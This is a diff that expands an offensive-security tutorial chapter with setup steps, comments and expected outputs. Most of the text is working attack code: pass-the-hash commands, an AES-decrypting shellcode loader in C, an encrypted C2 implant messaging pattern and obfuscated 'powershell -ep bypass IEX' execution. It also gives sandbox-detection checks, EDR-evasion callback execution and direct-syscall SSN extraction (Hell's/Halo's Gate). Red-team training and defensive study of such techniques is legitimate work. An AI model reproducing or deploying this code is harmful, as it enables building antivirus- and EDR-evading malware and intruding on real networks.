@@ -31,6 +31,156 @@ when it won't work, and what to use instead.
 
 ---
 
+## WINDOWS SETUP
+
+Every tool used in this chapter. Install everything before you start the drills.
+
+### Python Cryptography Library — pycryptodome
+
+**This is required before ANY Python code block in this chapter will run.**
+Without it you get `ModuleNotFoundError: No module named 'Crypto'` on the very
+first import line.
+
+```powershell
+# Install pycryptodome — provides the Crypto.* namespace used throughout
+pip install pycryptodome
+
+# Verify it installed correctly
+python -c "from Crypto.Cipher import AES; print('pycryptodome OK')"
+# Expected output: pycryptodome OK
+```
+
+**If you get "pip is not recognized":**
+```powershell
+python -m pip install pycryptodome
+```
+
+**If you have an old `pycrypto` installed (conflict):**
+```powershell
+pip uninstall pycrypto
+pip install pycryptodome
+```
+
+### Hashcat — GPU Hash Cracker
+
+Download: https://hashcat.net/hashcat/  
+Download the Windows binary release (`.7z` file). Extract to `C:\hashcat\`.
+
+```powershell
+# Add to PATH for this session (run from extraction folder)
+$env:PATH += ";C:\hashcat"
+
+# Verify
+hashcat --version
+# Expected output: v6.2.6 (or similar version number)
+```
+
+**No admin rights required for hashcat itself.** GPU driver must be installed
+(NVIDIA/AMD). If you see "No OpenCL platforms found", install your GPU drivers.
+
+### Hashcat Wordlists
+
+```powershell
+# Download rockyou.txt (standard wordlist, ~133MB)
+# Direct link: https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+# Save to C:\hashcat\wordlists\rockyou.txt
+
+# Verify
+(Get-Item C:\hashcat\wordlists\rockyou.txt).Length
+# Expected: ~139921497 (about 133MB)
+```
+
+### John the Ripper
+
+John the Ripper runs on Linux. It requires WSL2.
+
+```powershell
+# Install WSL2 (requires admin, one-time setup)
+wsl --install
+
+# After reboot, inside WSL2 terminal:
+sudo apt update && sudo apt install -y john
+john --version
+# Expected output: John the Ripper 1.9.0-jumbo-1 (or later)
+```
+
+> **Admin rights required** for `wsl --install`. Run that PowerShell command
+> as Administrator. Everything after the reboot is normal user.
+
+### Impacket Tools (ntlmrelayx, psexec, etc.)
+
+Impacket is a Python library. Best run from WSL2 or a Kali/Parrot VM.
+
+```bash
+# Inside WSL2:
+pip3 install impacket
+
+# Verify
+python3 -c "import impacket; print(impacket.__version__)"
+# Expected output: a version string like 0.11.0
+```
+
+### evil-winrm
+
+Requires WSL2 (Ruby-based tool).
+
+```bash
+# Inside WSL2:
+sudo gem install evil-winrm
+
+# Verify
+evil-winrm --version
+# Expected output: Evil-WinRM shell v3.x
+```
+
+### UPX Packer (optional, for packing section)
+
+Download: https://upx.github.io/  
+Windows binary available. Extract `upx.exe` to `C:\tools\`.
+
+```powershell
+C:\tools\upx.exe --version
+# Expected output: Ultimate Packer for eXecutables ... v4.x
+```
+
+### PadBuster (optional, for padding oracle section)
+
+Requires WSL2 and Perl.
+
+```bash
+# Inside WSL2:
+sudo apt install -y libwww-perl
+wget https://raw.githubusercontent.com/AonCyberLabs/PadBuster/master/padBuster.pl
+chmod +x padBuster.pl
+perl padBuster.pl --help
+# Expected: usage information printed to screen
+```
+
+### C Compiler (for C code blocks)
+
+The C loader examples in this chapter are conceptual reference. To actually
+compile them you need a Windows C compiler.
+
+```powershell
+# Option 1: Visual Studio Build Tools (free, no IDE)
+# Download: https://visualstudio.microsoft.com/downloads/#build-tools-for-visual-studio-2022
+# Install "Desktop development with C++" workload
+
+# Verify after install (open Developer Command Prompt)
+cl.exe
+# Expected: Microsoft C/C++ Optimizing Compiler version XX.XX
+
+# Option 2: MinGW-w64 (lighter, gcc on Windows)
+# Download: https://www.mingw-w64.org/downloads/ → WinLibs standalone
+# Extract, add bin\ folder to PATH
+gcc --version
+# Expected: gcc (MinGW-W64) 13.x.x or similar
+```
+
+> **Admin rights required** for Visual Studio Build Tools installer.
+
+---
+
 ## Crypto Fundamentals — What You Actually Need
 
 Skip the academic theory. You don't need to prove RSA's correctness
@@ -53,15 +203,31 @@ ciphertext XOR key = plaintext
 ```python
 # XOR encryption/decryption — identical operation
 def xor_crypt(data: bytes, key: bytes) -> bytes:
+    # For every byte in data, XOR it with the corresponding key byte
+    # (i % len(key)) makes the key repeat if it's shorter than data
     return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
 
-shellcode = b"\xfc\x48\x83\xe4\xf0..."
-key = b"\xde\xad\xbe\xef"
+shellcode = b"\xfc\x48\x83\xe4\xf0..."  # your raw shellcode bytes
+key = b"\xde\xad\xbe\xef"               # 4-byte XOR key
 
-encrypted = xor_crypt(shellcode, key)    # encrypt
-decrypted = xor_crypt(encrypted, key)    # decrypt — same function
-assert decrypted == shellcode
+encrypted = xor_crypt(shellcode, key)    # encrypt — XOR with key
+decrypted = xor_crypt(encrypted, key)    # decrypt — same function, same key, reverses it
+assert decrypted == shellcode            # sanity check: should be identical to original
 ```
+
+### Expected Output
+
+**Success:**
+```
+(no output — assert passes silently)
+```
+
+**Failure looks like `AssertionError` — means the decrypt didn't produce the
+original bytes. Check you're using the same key for both calls.**
+
+**Failure looks like `ModuleNotFoundError` — you haven't run `pip install pycryptodome` yet.**
+
+---
 
 **XOR's weakness**: With a short repeating key, XOR is trivially
 broken by frequency analysis. Defender KNOWS this. Modern AV engines
@@ -80,31 +246,61 @@ AES-128, AES-192, AES-256. Block cipher operating on 16-byte blocks.
 This is what you use when you actually need encryption that holds up.
 
 ```python
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad, unpad
-from Crypto.Random import get_random_bytes
+from Crypto.Cipher import AES          # requires: pip install pycryptodome
+from Crypto.Util.Padding import pad, unpad  # pad = add PKCS7 padding, unpad = strip it
+from Crypto.Random import get_random_bytes  # cryptographically secure random bytes
 import os
 
 def aes_encrypt(plaintext: bytes, key: bytes) -> tuple:
-    iv = get_random_bytes(16)
-    cipher = AES.new(key, AES.MODE_CBC, iv)
+    iv = get_random_bytes(16)           # random 16-byte IV — different every call
+    cipher = AES.new(key, AES.MODE_CBC, iv)  # CBC mode cipher object
+    # pad() adds bytes to make plaintext length a multiple of block_size (16)
     ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
-    return iv, ciphertext
+    return iv, ciphertext               # return both — you need IV to decrypt
 
 def aes_decrypt(iv: bytes, ciphertext: bytes, key: bytes) -> bytes:
-    cipher = AES.new(key, AES.MODE_CBC, iv)
-    return unpad(cipher.decrypt(ciphertext), AES.block_size)
+    cipher = AES.new(key, AES.MODE_CBC, iv)  # reconstruct cipher with same IV + key
+    return unpad(cipher.decrypt(ciphertext), AES.block_size)  # decrypt then strip padding
 
-# Generate a random 256-bit key
+# Generate a random 256-bit key (32 bytes = AES-256)
 key = get_random_bytes(32)
 
 # Encrypt shellcode
-shellcode = b"\xfc\x48\x83\xe4\xf0..."
+shellcode = b"\xfc\x48\x83\xe4\xf0..."  # your shellcode bytes here
 iv, encrypted = aes_encrypt(shellcode, key)
 
 # Decrypt at runtime
 decrypted = aes_decrypt(iv, encrypted, key)
 ```
+
+### Expected Output
+
+**Success:**
+```
+(no output — decrypted will equal shellcode if you print/compare them)
+```
+
+**Quick test you can run:**
+```python
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+from Crypto.Random import get_random_bytes
+
+key = get_random_bytes(32)
+plaintext = b"hello world test"
+iv = get_random_bytes(16)
+cipher = AES.new(key, AES.MODE_CBC, iv)
+ct = cipher.encrypt(pad(plaintext, AES.block_size))
+cipher2 = AES.new(key, AES.MODE_CBC, iv)
+pt = unpad(cipher2.decrypt(ct), AES.block_size)
+print(pt)  # b'hello world test'
+```
+
+**Failure looks like `ValueError: Data must be aligned to block boundary in ECB mode` — means your plaintext wasn't padded before encrypting. Always use `pad()` on the input.**
+
+**Failure looks like `ValueError: Padding is incorrect` on decrypt — means you're using a different IV or key to decrypt than you used to encrypt.**
+
+---
 
 **CBC mode**: Each block is XOR'd with the previous ciphertext block
 before encryption. The first block uses the Initialization Vector (IV).
@@ -124,26 +320,42 @@ the plaintext. Simpler to implement than AES, smaller code footprint.
 
 ```python
 # RC4 implementation — small enough to embed in a loader
+# No external imports needed — pure Python
 def rc4(key: bytes, data: bytes) -> bytes:
-    S = list(range(256))
+    S = list(range(256))    # state array — 256 values, 0-255
     j = 0
-    # Key-scheduling algorithm (KSA)
+    # Key-scheduling algorithm (KSA) — shuffles S using the key
     for i in range(256):
-        j = (j + S[i] + key[i % len(key)]) % 256
-        S[i], S[j] = S[j], S[i]
-    # Pseudo-random generation algorithm (PRGA)
+        j = (j + S[i] + key[i % len(key)]) % 256  # key byte cycles if key is short
+        S[i], S[j] = S[j], S[i]                    # swap — scrambles S based on key
+    # Pseudo-random generation algorithm (PRGA) — generates keystream
     i = j = 0
     result = bytearray()
     for byte in data:
         i = (i + 1) % 256
         j = (j + S[i]) % 256
-        S[i], S[j] = S[j], S[i]
-        result.append(byte ^ S[(S[i] + S[j]) % 256])
+        S[i], S[j] = S[j], S[i]                    # another swap
+        result.append(byte ^ S[(S[i] + S[j]) % 256])  # XOR data byte with keystream byte
     return bytes(result)
 
-encrypted = rc4(b"my_secret_key", shellcode)
-decrypted = rc4(b"my_secret_key", encrypted)  # same function, same key
+encrypted = rc4(b"my_secret_key", shellcode)         # encrypt
+decrypted = rc4(b"my_secret_key", encrypted)         # decrypt — same function, same key
 ```
+
+### Expected Output
+
+**Success:**
+```python
+shellcode = b"\xfc\x48\x83\xe4\xf0\x50\x57"
+enc = rc4(b"my_secret_key", shellcode)
+dec = rc4(b"my_secret_key", enc)
+print(dec == shellcode)   # True
+print(enc.hex())          # something like: 8a3f7c1d2e... (different from input)
+```
+
+**Failure looks like `TypeError: 'int' object is not subscriptable` — means `key` was passed as a string not bytes. Use `b"key"` not `"key"`.**
+
+---
 
 **RC4 in the wild**: Cobalt Strike uses RC4 for stager communication.
 Metasploit's `shikata_ga_nai` encoder uses a polymorphic XOR scheme
@@ -169,24 +381,37 @@ primes for RSA, discrete logarithms for ECC).
   establishes this without ever transmitting the key in the clear.
 
 ```python
-from Crypto.PublicKey import RSA
-from Crypto.Cipher import PKCS1_OAEP
+from Crypto.PublicKey import RSA        # requires: pip install pycryptodome
+from Crypto.Cipher import PKCS1_OAEP   # OAEP = padding scheme for RSA encryption
 
-# Generate RSA keypair (done once, offline)
-key = RSA.generate(2048)
-private_key = key.export_key()
-public_key = key.publickey().export_key()
+# Generate RSA keypair (done once, offline — store the private key securely)
+key = RSA.generate(2048)               # 2048-bit key — standard minimum
+private_key = key.export_key()         # PEM-encoded private key bytes
+public_key = key.publickey().export_key()  # PEM-encoded public key bytes
 
-# Encrypt with public key (anyone can do this)
+# Encrypt with public key (anyone can do this — public key can be distributed)
 recipient_key = RSA.import_key(public_key)
-cipher = PKCS1_OAEP.new(recipient_key)
-encrypted = cipher.encrypt(b"secret_session_key_here")
+cipher = PKCS1_OAEP.new(recipient_key)            # OAEP cipher using public key
+encrypted = cipher.encrypt(b"secret_session_key_here")  # max ~214 bytes for 2048-bit RSA
 
-# Decrypt with private key (only key holder)
+# Decrypt with private key (only the key holder can do this)
 private = RSA.import_key(private_key)
-decipher = PKCS1_OAEP.new(private)
-decrypted = decipher.decrypt(encrypted)
+decipher = PKCS1_OAEP.new(private)                # OAEP cipher using private key
+decrypted = decipher.decrypt(encrypted)            # recovers the original plaintext
 ```
+
+### Expected Output
+
+**Success:**
+```python
+print(decrypted)  # b'secret_session_key_here'
+```
+
+**Failure looks like `ValueError: RSA key format is not supported` — means the key bytes got corrupted or you passed the wrong variable. Print `private_key` and check it starts with `-----BEGIN RSA PRIVATE KEY-----`.**
+
+**Failure looks like `ValueError: Plaintext is too long` — RSA can only encrypt small amounts of data (up to ~214 bytes for a 2048-bit key). Use RSA to encrypt a small AES key, then use AES for the actual payload.**
+
+---
 
 ### Hashing — One-Way Functions
 
@@ -215,15 +440,30 @@ for authentication.** You don't need to crack the hash to use it.
 
 ```bash
 # Pass-the-Hash — authenticate with the hash, no password needed
-# Using evil-winrm:
+# Using evil-winrm (run inside WSL2):
 evil-winrm -i <target> -u Administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
 
-# Using impacket's psexec:
+# Using impacket's psexec (run inside WSL2):
 python psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 administrator@<target>
 
-# Using crackmapexec:
+# Using crackmapexec (run inside WSL2):
 crackmapexec smb <target> -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
 ```
+
+### Expected Output
+
+**evil-winrm success:**
+```
+Evil-WinRM shell v3.x
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
+```
+
+**Failure looks like `ERROR: An error of type WinRM::WinRMAuthorizationError` — means the hash is wrong, the account doesn't have WinRM access, or WinRM is not enabled on the target.**
+
+**Failure looks like `Connection refused` — WinRM is not listening (port 5985/5986 closed). Try psexec instead.**
+
+---
 
 This is why NTLM hash extraction (from SAM, LSASS, DCSync) is such a
 high-value post-exploitation step. The hash IS the credential.
@@ -245,61 +485,81 @@ to any static analysis tool until the moment it executes.
 
 ```c
 // C loader structure — the pattern every AV-evading loader follows
+// Compile with: cl.exe loader.c /link bcrypt.lib  (or gcc -o loader loader.c -lbcrypt)
 #include <windows.h>
 #include <stdio.h>
 
-// AES-encrypted shellcode blob (generated by your encryptor script)
+// AES-encrypted shellcode blob (generated by your Python encryptor script)
+// These are placeholder bytes — replace with real output from aes_encrypt()
 unsigned char encrypted_shellcode[] = { 0x8a, 0x3f, 0x7c, ... };
-unsigned char aes_key[] = { 0x01, 0x02, 0x03, ... };  // 32 bytes
-unsigned char aes_iv[]  = { 0xa1, 0xb2, 0xc3, ... };  // 16 bytes
+unsigned char aes_key[] = { 0x01, 0x02, 0x03, ... };  // 32 bytes = AES-256 key
+unsigned char aes_iv[]  = { 0xa1, 0xb2, 0xc3, ... };  // 16 bytes = CBC initialization vector
 
-// AES-CBC decryption using Windows CNG (no external dependencies)
+// AES-CBC decryption using Windows CNG (Cryptography Next Generation)
+// CNG is built into Windows — no external crypto library needed in the binary
 BOOL decrypt_payload(unsigned char* ciphertext, DWORD ct_len,
                      unsigned char* key, unsigned char* iv,
                      unsigned char** plaintext, DWORD* pt_len) {
-    BCRYPT_ALG_HANDLE hAlg;
-    BCRYPT_KEY_HANDLE hKey;
+    BCRYPT_ALG_HANDLE hAlg;   // algorithm provider handle
+    BCRYPT_KEY_HANDLE hKey;   // key object handle
 
+    // Open AES algorithm provider from the built-in CNG library
     BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
+    // Set chaining mode to CBC
     BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                       (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                       sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
+    // Import our key bytes into a CNG key object
     BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, key, 32, 0);
 
-    // Get output size
+    // First call: get the output size without actually decrypting
     BCryptDecrypt(hKey, ciphertext, ct_len, NULL, iv, 16, NULL, 0, pt_len, BCRYPT_BLOCK_PADDING);
 
+    // Allocate output buffer now that we know the size
     *plaintext = (unsigned char*)malloc(*pt_len);
+    // Second call: actually decrypt into the buffer
     BCryptDecrypt(hKey, ciphertext, ct_len, NULL, iv, 16, *plaintext, *pt_len, pt_len, BCRYPT_BLOCK_PADDING);
 
-    BCryptDestroyKey(hKey);
-    BCryptCloseAlgorithmProvider(hAlg, 0);
+    BCryptDestroyKey(hKey);             // clean up key object
+    BCryptCloseAlgorithmProvider(hAlg, 0);  // clean up algorithm handle
     return TRUE;
 }
 
 int main() {
-    unsigned char* shellcode;
-    DWORD shellcode_len;
+    unsigned char* shellcode;   // will hold decrypted shellcode
+    DWORD shellcode_len;        // will hold its length
 
-    // Decrypt at runtime
+    // Decrypt at runtime — plaintext shellcode never on disk
     decrypt_payload(encrypted_shellcode, sizeof(encrypted_shellcode),
                     aes_key, aes_iv, &shellcode, &shellcode_len);
 
-    // Allocate executable memory
+    // Allocate RW memory (not RWX yet — changing permissions separately is less suspicious)
     void* exec = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE,
                               PAGE_READWRITE);
-    memcpy(exec, shellcode, shellcode_len);
+    memcpy(exec, shellcode, shellcode_len);  // copy decrypted shellcode into allocated region
 
-    // Change permissions to executable
-    DWORD old;
+    // Flip to executable — this permission change is what EDR watches
+    DWORD old;  // old permissions stored here (required by VirtualProtect)
     VirtualProtect(exec, shellcode_len, PAGE_EXECUTE_READ, &old);
 
-    // Execute
+    // Cast the memory region to a function pointer and call it
     ((void(*)())exec)();
 
     return 0;
 }
 ```
+
+### Expected Output
+
+**This is a C skeleton — it won't compile until you replace the `...` placeholders.**
+The pattern to test: run your Python `aes_encrypt()` to produce real byte arrays,
+paste them in place of the placeholder arrays, compile, and test in a VM.
+
+**Failure looks like `LNK2019: unresolved external symbol BCrypt...` — means you forgot to link `bcrypt.lib`. Add `/link bcrypt.lib` to your compile command.**
+
+**Failure looks like `Access violation` on the `((void(*)())exec)()` line — the shellcode is either corrupted during decryption or the key/IV don't match what was used to encrypt.**
+
+---
 
 **Key management for payloads**: The key has to be in the binary
 somewhere (or derived at runtime). Options:
@@ -329,38 +589,55 @@ domain fronting (if still available), or CDN redirectors.
 
 ```python
 # Simple encrypted C2 communication pattern
+# Requires: pip install pycryptodome
 import socket
 from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
 from Crypto.Util.Padding import pad, unpad
-import struct
+import struct  # for packing/unpacking binary integers
 
-SHARED_KEY = b'\x00' * 32  # In reality, derived via key exchange
+SHARED_KEY = b'\x00' * 32  # 32-byte AES-256 key — in reality, derived via key exchange
 
 def encrypt_msg(plaintext: bytes) -> bytes:
-    iv = get_random_bytes(16)
+    iv = get_random_bytes(16)              # fresh random IV for each message
     cipher = AES.new(SHARED_KEY, AES.MODE_CBC, iv)
     ct = cipher.encrypt(pad(plaintext, AES.block_size))
-    # Prepend IV and length
+    # Pack as: [4-byte length][16-byte IV][ciphertext]
+    # '>I' = big-endian unsigned int (4 bytes) for the length prefix
     return struct.pack('>I', len(ct)) + iv + ct
 
 def decrypt_msg(data: bytes) -> bytes:
-    length = struct.unpack('>I', data[:4])[0]
-    iv = data[4:20]
-    ct = data[20:20+length]
+    length = struct.unpack('>I', data[:4])[0]  # read 4-byte length prefix
+    iv = data[4:20]                             # next 16 bytes are the IV
+    ct = data[20:20+length]                     # rest is ciphertext
     cipher = AES.new(SHARED_KEY, AES.MODE_CBC, iv)
     return unpad(cipher.decrypt(ct), AES.block_size)
 
 # Implant sends encrypted tasking result
 def send_result(sock, result: bytes):
-    encrypted = encrypt_msg(result)
+    encrypted = encrypt_msg(result)  # encrypt before sending
     sock.send(encrypted)
 
 # C2 server receives and decrypts
 def recv_task(sock) -> bytes:
-    data = sock.recv(4096)
-    return decrypt_msg(data)
+    data = sock.recv(4096)           # receive raw encrypted bytes
+    return decrypt_msg(data)         # decrypt and return plaintext
 ```
+
+### Expected Output
+
+**Loopback test to verify encrypt/decrypt round-trip:**
+```python
+msg = b"whoami result: NT AUTHORITY\\SYSTEM"
+encrypted = encrypt_msg(msg)
+print(f"Encrypted length: {len(encrypted)} bytes")   # longer than plaintext due to IV + padding
+decrypted = decrypt_msg(encrypted)
+print(decrypted)   # b'whoami result: NT AUTHORITY\\SYSTEM'
+```
+
+**Failure looks like `struct.error: unpack requires a buffer of 4 bytes` — means the received data is incomplete. Your recv() didn't get the full message. In real code, loop recv() until you have all bytes.**
+
+---
 
 **Malleable C2 profiles** (Cobalt Strike concept): Shape your C2 traffic
 to mimic legitimate application traffic — match HTTP headers, URI
@@ -428,8 +705,10 @@ subprocess.Popen(["powershell", "-ep", "bypass", "-c", "IEX(...)"])
 
 # After basic obfuscation:
 import subprocess as _0x1f
+# Build the string "powershell" by concatenating individual character codes
 _0x2a = chr(112)+chr(111)+chr(119)+chr(101)+chr(114)+chr(115)+chr(104)+chr(101)+chr(108)+chr(108)
 _0x3b = [_0x2a, "-ep", "bypass", "-c", "IEX(...)"]
+# Call subprocess.Popen by constructing the attribute name via chr() calls
 getattr(_0x1f, chr(80)+chr(111)+chr(112)+chr(101)+chr(110))(_0x3b)
 
 # After GOOD obfuscation:
@@ -459,18 +738,21 @@ the binary — function names, hardcoded URLs, known shellcode patterns.
 
 ```c
 // Before: Defender signatures match "VirtualAlloc" string import
+// The string "VirtualAlloc" appears literally in the binary's import table
 void* exec = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
 // After: Dynamic API resolution — no "VirtualAlloc" string in binary
+// Define a function pointer type matching VirtualAlloc's signature
 typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
 
-// XOR-encrypted function name
+// XOR-encrypted function name — the string "VirtualAlloc" never appears in plaintext
 unsigned char enc_name[] = { 0x36, 0x49, 0x52, 0x54, 0x55, 0x41, 0x4c, ... };
 char func_name[32];
-xor_decrypt(enc_name, sizeof(enc_name), func_name, xor_key);  // → "VirtualAlloc"
+xor_decrypt(enc_name, sizeof(enc_name), func_name, xor_key);  // decrypt to "VirtualAlloc" at runtime
 
+// Get the function address dynamically — no import table entry
 pVirtualAlloc myAlloc = (pVirtualAlloc)GetProcAddress(
-    GetModuleHandleA("kernel32.dll"), func_name);
+    GetModuleHandleA("kernel32.dll"), func_name);  // resolve at runtime
 void* exec = myAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 ```
 
@@ -485,6 +767,18 @@ upx --best payload.exe -o packed.exe
 # Custom packers are more effective because AV doesn't have a generic
 # unpacker for them. Writing a custom packer is a solid exercise.
 ```
+
+### Expected Output
+
+```
+Ultimate Packer for eXecutables ... packed -> packed.exe (ratio: ~0.xx)
+```
+
+**Failure looks like `NotPackedException: payload.exe is not packed by UPX` when trying to unpack something not packed — this is fine, you're packing not unpacking.**
+
+**Failure looks like `CantPackException: file is too small` — UPX needs at least a valid PE binary. You can't pack a .py or .txt file.**
+
+---
 
 **Metamorphism**: Generate functionally identical code with different
 byte sequences each time. Same behavior, different signature. This is
@@ -509,15 +803,16 @@ sleep calls — so you need smarter delays:
 // Naive sleep — sandbox detects and fast-forwards
 Sleep(300000);  // 5 minutes — sandbox patches this to return immediately
 
-// Better: time-based check
-DWORD start = GetTickCount();
+// Better: time-based check using a CPU-intensive loop
+DWORD start = GetTickCount();  // record start time in milliseconds
 // Do some busy work (calculate primes, allocate/free memory, etc.)
-volatile int x = 0;
-for (int i = 0; i < 100000000; i++) x += i;
-DWORD elapsed = GetTickCount() - start;
+volatile int x = 0;            // volatile prevents compiler from optimizing loop away
+for (int i = 0; i < 100000000; i++) x += i;  // ~1 second of real CPU work
+DWORD elapsed = GetTickCount() - start;       // how long did that actually take?
 
 // If elapsed < 1000ms, we're in a sandbox that fast-forwarded our busy loop
-if (elapsed < 1000) ExitProcess(0);
+// On real hardware this loop takes ~1 second; in a fast-forwarding sandbox it takes ~0ms
+if (elapsed < 1000) ExitProcess(0);  // exit clean — looks benign to sandbox
 
 // Even better: use NtDelayExecution and check with QueryPerformanceCounter
 // Sandboxes that hook Sleep might not hook the NT-level equivalent
@@ -526,29 +821,29 @@ if (elapsed < 1000) ExitProcess(0);
 **Environment checks**: Detect sandboxes before executing the payload:
 
 ```c
-// Check for common sandbox indicators
+// Check for common sandbox indicators — returns TRUE if we're probably in a sandbox
 BOOL is_sandbox() {
-    // Check RAM (sandboxes often have <4GB)
+    // Check RAM (sandboxes often have <4GB to save resources)
     MEMORYSTATUSEX mem;
     mem.dwLength = sizeof(mem);
     GlobalMemoryStatusEx(&mem);
-    if (mem.ullTotalPhys < 4LL * 1024 * 1024 * 1024) return TRUE;
+    if (mem.ullTotalPhys < 4LL * 1024 * 1024 * 1024) return TRUE;  // less than 4GB
 
     // Check CPU cores (sandboxes often have 1-2 cores)
     SYSTEM_INFO si;
     GetSystemInfo(&si);
-    if (si.dwNumberOfProcessors < 2) return TRUE;
+    if (si.dwNumberOfProcessors < 2) return TRUE;  // single-core = suspicious
 
     // Check for recent user interaction (sandbox = no mouse movement)
     LASTINPUTINFO lii;
     lii.cbSize = sizeof(lii);
     GetLastInputInfo(&lii);
-    if ((GetTickCount() - lii.dwTime) > 600000) return TRUE;  // 10min idle
+    if ((GetTickCount() - lii.dwTime) > 600000) return TRUE;  // 10min idle = no human
 
     // Check disk size (sandbox disks are often <60GB)
     ULARGE_INTEGER disk;
     GetDiskFreeSpaceExA("C:\\", NULL, &disk, NULL);
-    if (disk.QuadPart < 60LL * 1024 * 1024 * 1024) return TRUE;
+    if (disk.QuadPart < 60LL * 1024 * 1024 * 1024) return TRUE;  // <60GB total = VM
 
     // Check for VM artifacts
     // Registry: HKLM\SOFTWARE\VMware, Inc.
@@ -556,7 +851,7 @@ BOOL is_sandbox() {
     // Processes: vmtoolsd.exe, vmwaretray.exe
     // MAC address prefixes: 00:0C:29, 00:50:56 (VMware)
 
-    return FALSE;
+    return FALSE;  // passed all checks — probably a real system
 }
 ```
 
@@ -571,23 +866,23 @@ function — that's suspicious regardless of what it writes."
 shellcode loader uses, break the pattern:
 
 ```c
-// Classic pattern — every EDR flags this
+// Classic pattern — every EDR flags this sequence
 void* mem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 memcpy(mem, shellcode, size);
 DWORD old;
 VirtualProtect(mem, size, PAGE_EXECUTE_READ, &old);
 CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
 
-// Pattern-broken version:
-// 1. Use different allocation API
+// Pattern-broken version — same result, different API sequence:
+// 1. Use HeapAlloc instead of VirtualAlloc
 void* mem = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size + 0x1000);
-// 2. Copy in chunks with delays between
+// 2. Copy in 64-byte chunks with tiny delays — breaks memcpy-then-protect signature
 for (int i = 0; i < size; i += 64) {
     memcpy((char*)mem + i, shellcode + i, min(64, size - i));
-    SleepEx(1, FALSE);  // tiny delay between copies
+    SleepEx(1, FALSE);  // 1ms delay between copies — breaks timing heuristics
 }
-// 3. Use NtProtectVirtualMemory instead of VirtualProtect
-// 4. Execute via callback, not CreateThread
+// 3. Use NtProtectVirtualMemory instead of VirtualProtect (lower-level, fewer hooks)
+// 4. Execute via callback — no CreateThread call at all
 EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, 0);
 // Windows calls YOUR code as a callback. No CreateThread needed.
 ```
@@ -597,9 +892,11 @@ calling `CreateThread` or `CreateRemoteThread`:
 
 ```c
 // These all execute a function pointer through legitimate Windows callbacks:
+// Windows passes your shellcode_addr as a function pointer it then calls internally
 EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)shellcode_addr, 0);
 EnumChildWindows(NULL, (WNDENUMPROC)shellcode_addr, 0);
 EnumDisplayMonitors(NULL, NULL, (MONITORENUMPROC)shellcode_addr, 0);
+// Timer-based: Windows calls shellcode_addr after 0ms timeout
 CreateTimerQueueTimer(&timer, NULL, (WAITORTIMERCALLBACK)shellcode_addr, NULL, 0, 0, 0);
 ```
 
@@ -646,10 +943,10 @@ No ntdll, no hooks, no EDR visibility.
 ```nasm
 ; Direct syscall for NtAllocateVirtualMemory (Windows 10 21H2)
 ; Syscall number (SSN) = 0x18
-mov r10, rcx
-mov eax, 0x18          ; syscall number for NtAllocateVirtualMemory
-syscall
-ret
+mov r10, rcx        ; Windows syscall convention: first arg goes in r10 (not rcx)
+mov eax, 0x18       ; syscall number for NtAllocateVirtualMemory — hardcoded here
+syscall             ; jump directly to kernel — bypasses ntdll entirely
+ret                 ; return to caller
 ```
 
 **The problem**: Syscall numbers change between Windows versions. The
@@ -664,28 +961,29 @@ Hell's Gate reads the SSN directly from the ntdll.dll image in memory:
 // Simplified Hell's Gate concept
 // NtAllocateVirtualMemory in ntdll starts with:
 //   4c 8b d1     mov r10, rcx
-//   b8 XX 00 00 00  mov eax, <SSN>
+//   b8 XX 00 00 00  mov eax, <SSN>   ← XX is the syscall number we want
 //   ...
 //   0f 05        syscall
 //   c3           ret
 
-// If it starts with 4c 8b d1 b8, the SSN is the byte after b8
-// If it starts with e9 (JMP) — the function is HOOKED
+// If it starts with 4c 8b d1 b8 → unhooked, SSN is the byte after b8
+// If it starts with e9 (JMP) → the function is HOOKED by EDR
 
 DWORD get_ssn(FARPROC func_addr) {
-    BYTE* bytes = (BYTE*)func_addr;
-    // Check if function is hooked (starts with JMP)
+    BYTE* bytes = (BYTE*)func_addr;   // treat the function address as a byte array
+    // Check if function is hooked (EDR JMP patch — 0xe9 = JMP opcode)
     if (bytes[0] == 0xe9) {
         // Function is hooked — Hell's Gate fails here
         // Need Halo's Gate or another technique
         return 0;
     }
-    // Unhooked: extract SSN from mov eax, <SSN>
+    // Unhooked: check for expected prologue bytes and extract SSN
+    // 4c 8b d1 = mov r10, rcx | b8 = start of mov eax, imm32
     if (bytes[0] == 0x4c && bytes[1] == 0x8b && bytes[2] == 0xd1 &&
         bytes[3] == 0xb8) {
-        return *(DWORD*)(bytes + 4);
+        return *(DWORD*)(bytes + 4);  // the 4 bytes starting at offset 4 are the SSN
     }
-    return 0;
+    return 0;  // unrecognized prologue — can't extract SSN
 }
 ```
 
@@ -698,27 +996,29 @@ function above it in ntdll's export table has SSN 0x17 and the one
 below has SSN 0x19.
 
 ```c
-// Halo's Gate: if target function is hooked, check neighbors
+// Halo's Gate: if target function is hooked, check neighbors to infer our SSN
 DWORD halos_gate(FARPROC func_addr, DWORD func_index_in_table) {
     BYTE* bytes = (BYTE*)func_addr;
 
     // If not hooked, use Hell's Gate directly
